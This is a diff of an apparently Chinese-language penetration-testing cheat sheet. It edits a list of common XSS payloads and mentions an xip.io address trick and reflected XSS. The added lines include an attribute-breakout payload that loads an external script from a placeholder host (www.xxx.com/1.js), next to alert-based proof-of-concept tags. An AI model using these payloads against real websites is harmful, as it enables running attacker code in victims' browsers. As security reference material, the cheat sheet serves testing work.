@@ -14,7 +14,10 @@ xip.io：10.0.0.1.xip.io = 10.0.0.1
 通过js跳转
 # XSS
 ## 常见payload
-<script>alert(1);</script>
+
+1. <script>alert(1);</script>
 <img src=0 onerror=alert(1)>
+
+2. "><script src=http://www.xxx.com/1.js></script>"
 
 反射XSS，欺骗用户点击，可能会被浏览器过滤
